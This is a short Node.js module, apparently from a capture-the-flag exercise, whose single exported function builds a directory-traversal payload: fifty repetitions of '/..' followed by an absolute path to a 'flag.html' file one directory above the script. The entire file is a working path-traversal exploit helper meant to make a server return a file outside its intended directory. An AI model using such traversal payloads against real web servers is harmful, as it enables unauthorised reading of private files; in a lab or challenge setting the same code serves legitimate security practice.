function getPayload() {
    const path = require("path");  // Ensure path module is required
    const pathToFlag = path.resolve(__dirname, "../flag.html");
    return "/..".repeat(50) + pathToFlag;
}

module.exports = { getPayload };